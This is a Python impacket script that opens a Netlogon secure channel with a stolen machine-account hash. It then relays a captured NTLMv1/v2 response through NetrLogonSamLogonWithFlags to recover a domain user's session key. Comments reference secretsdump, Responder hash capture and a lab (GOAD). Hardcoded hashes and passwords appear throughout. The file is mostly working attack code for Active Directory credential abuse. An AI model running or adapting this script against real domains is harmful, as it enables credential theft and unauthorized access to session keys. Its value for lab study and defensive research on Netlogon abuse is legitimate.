from impacket.dcerpc.v5 import epm, lsad, rpcrt, transport, lsat, ndr, nrpc
from impacket.uuid import bin_to_uuidtup
from binascii import unhexlify, hexlify
from struct import pack, unpack
from random import randbytes
import sys

# Perform a netrlogonsamlogonwithflags with a server account, it uses netlogon as SSP (see [MS-NRPC] 3.3)
# Pure TCP RPC is used (ncacn_ip_tcp option)
# RC4 is used here because to use AES, impacket must be patched
# Hashes are captured during NTLMv1 authentication (Local Security: Sen LM and NTLM, Responder with --disable-ess)
# Tested with impacket 0.12.0 on GOAD
# Usage example: python3 netrlogonsamlogonwithflags.py
# @lowercase_drm

# Parameters to setup the secure channel, here we use NORTH\CASTELBLACK account
# 192.168.56.11
host="10.13.37.102"
# secretsdump.py north/robb.stark:'sexywolfy'@192.168.56.11 -just-dc-user 'CASTELBLACK$'
computer_hash = unhexlify('fbe53598188c75f9a1f601b827d39c4a')
# MS-NRPC 3.5.4.1 Binding Handles
# it can be '': If the string is NULL, the server is the same as the client (that is, the local computer)
primary_name = ""
# The client computer calling this method
computer_name = 'EVIL'
domain = 'LAB.LOCAL'
# String that identifies the name of the account that contains the secret key (password) that is shared between the client and the server
account_name = computer_name + '$'
# The set_credentials() method needs a password but it is not used in this script
password = 'K4zcFcXJ7nhG6XDGIqnTm9vKV8rzBMlI'
# Choose between INTEGRITY (SIGN) and PRIVACY (SIGN + SEAL)
# I recommend to swith to INTEGRITY for debugging with Wireshark
#authn_level_packet = rpcrt.RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
authn_level_packet = rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

# Parameters for netrlogonsamlogonwithflags
# Here, we want to retrieve the session key for DC account, WINTERFELL
logon_server = 'WIN-KIMMCJSU609'
target_domain = 'LAB.LOCAL'
target_username = 'test'

# [SMB] NTLMv1-SSP Hash: WINTERFELL$::NORTH:FE6A034E2BABEF9922D8444B9B975DB0A9CF5D2C7E290E63:FE6A034E2BABEF9922D8444B9B975DB0A9CF5D2C7E290E63:712d0f9a2fb19743
captured_hash = "test::LAB.LOCAL:aaaaaaaaaaaaaaaa:29007b70c1d47ac25b5e7ca90001e82e:0101000000000000004455d19977dc01693553366f58764100000000010010007a007300500073006400510044006d00030010007a007300500073006400510044006d00020010006500690068004d004c004f0066005000040010006500690068004d004c004f006600500007000800004455d19977dc0109001a0063006900660073002f007a007300500073006400510044006d0000000000"
parts = captured_hash.split(':')
challenge = unhexlify("666ae133c859e3bd")
ansLM = unhexlify("b297eb1741f662e4160ea95309c0d8ab36526d703447677a")
ansNT = unhexlify("3f3987b788e382209f64dec8914440590101000000000000209b86d6a077dc0136526d703447677a00000000020006004c004100420001001e00570049004e002d004b0049004d004d0043004a0053005500360030003900040012004c00410042002e004c004f00430041004c0003003200570049004e002d004b0049004d004d0043004a00530055003600300039002e004c00410042002e004c004f00430041004c00050012004c00410042002e004c004f00430041004c0007000800209b86d6a077dc0109003c0063006900660073002f00570049004e002d004b0049004d004d0043004a00530055003600300039002e004c00410042002e004c004f00430041004c0000000000")

lm_challenge = challenge
ntlm_challenge_response = ansNT
lm_challenge_response = ansLM

nrpc_uid = nrpc.MSRPC_UUID_NRPC
syntax = rpcrt.DCERPC.NDR64Syntax

print('[+] Calling hept_map: {}'.format(bin_to_uuidtup(nrpc_uid)))
binding_string_nrpc = epm.hept_map(host, nrpc_uid, dataRepresentation=syntax, protocol='ncacn_ip_tcp')
print("[x] Binding string: {}".format(binding_string_nrpc))

rpctransport = transport.DCERPCTransportFactory(binding_string_nrpc)
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(nrpc.MSRPC_UUID_NRPC, transfer_syntax=bin_to_uuidtup(syntax))

# First of all, we need to generate a session key and a client credential
clientchall = randbytes(8)
print("[-] client chall: {}".format("".join((format(x, '02x') for x in clientchall))))
print("[x] Calling NetrServerReqChallenge")
resp = nrpc.hNetrServerReqChallenge(dce, primary_name, computer_name + '\x00', clientchall)
print("[x] NetrServerReqChallenge ok!")
serverchall = resp["ServerChallenge"]
print("[-] server chall: {}".format("".join((format(x, '02x') for x in serverchall))))
sessionKey = nrpc.ComputeSessionKeyStrongKey(None, clientchall, serverchall, computer_hash)
clientcred = nrpc.ComputeNetlogonCredential(clientchall, sessionKey)
print("[-] session Key: {}".format("".join((format(x, '02x') for x in sessionKey))))
print("[-] client credential: {}".format("".join((format(x, '02x') for x in clientcred))))

print("[+] Calling NetrServerAuthenticate3")
# Flag 0x600FFFFF to use RC4, 0x613FFFFF to use AES (but you need to patch impacket)
# TrustedDnsDomainSecureChannel to use a trust account
resp = nrpc.hNetrServerAuthenticate3(dce, primary_name + '\x00', account_name + '\x00', 
                                     nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, 
                                     computer_name + '\x00', clientcred, 0x600FFFFF)
print("[x] NetrServerAuthenticate3 ok!") 
# Life is too short to verify server credential, so we only display it
servercred = resp['ServerCredential']
print("[-] server credential: {}".format("".join((format(x, '02x') for x in servercred))))

# Always call set_auth_level() after set_credentials()
# because set_credentials() reset the auth level to RPC_C_AUTHN_LEVEL_CONNECT
dce.set_credentials(computer_name + '$', password, domain)
dce.set_auth_type(rpcrt.RPC_C_AUTHN_NETLOGON)
dce.set_auth_level(authn_level_packet)

# dce.alter_ctx does not keep confounder settings and increments ctx_id, so we use bind() with alter=1
resp = dce.bind(nrpc.MSRPC_UUID_NRPC, alter=1, transfer_syntax=bin_to_uuidtup(syntax))

auth = nrpc.ComputeNetlogonAuthenticator(clientcred, sessionKey)
print("[-] Netlogon authenticator: {}".format("".join((format(x, '02x') for x in auth['Credential']))))

dce.set_session_key(sessionKey)
print('[+] Calling NetrLogonGetCapabilities')
# This is our real test to know if the secure channel is ok
resp = nrpc.hNetrLogonGetCapabilities(dce, primary_name, computer_name, auth)
print("[x] NetrLogonGetCapabilities ok!")

# [MS-NRPC] 3.1.4.5 : If this is successful, the client stores the Netlogon credential 
# part of the Netlogon authenticator as the new Netlogon credential.
# If you want to perform multiple calls, keep in mind to update the authenticator with the ReturnAuthenticator
# if you keep the same, server will return `0xc0000022 - STATUS_ACCESS_DENIED`.
auth = resp['ReturnAuthenticator']
print("[-] Returned auth: {}".format("".join((format(x, '02x') for x in auth['Credential']))))

# Authentication and secure channel are ok, we can now call NetrLogonSamLogonWithFlags()
# impacket does not provide helper for it, so you need to manually create the PDU
request = nrpc.NetrLogonSamLogonWithFlags()
request['LogonServer'] = logon_server + '\x00'
request['ComputerName'] = computer_name + '\x00'
request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4

request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = target_domain
# ParameterControl is a mystery for me. This value is based on impacket's example, but what does it mean?
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/81c44fa0-0a27-41b3-b607-de39cce7ea1d 
# b'\x60\x00\x00\x00' works but not b'\x50\x00\x00\x00' (SessionError: code: 0xc000019a - STATUS_NOLOGON_SERVER_TRUST_ACCOUNT)
# help needed
request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = unpack('<L', b'\xe0\x2a\x00\x00')[0]
request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = target_username
request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''

request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = lm_challenge
request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = ntlm_challenge_response
request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = lm_challenge_response

request['Authenticator'] = auth
request['ReturnAuthenticator']['Credential'] = b'\x00'*8
request['ReturnAuthenticator']['Timestamp'] = 0
request['ExtraFlags'] = 0

print('[+] Calling NetrLogonSamLogonWithFlags')
resp = dce.request(request)
print("[x] NetrLogonSamLogonWithFlags ok!")

sessionKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']
print('[*] {0}\\{1} session key is: {2}'.format(target_domain, target_username, hexlify(sessionKey).decode('utf-8')))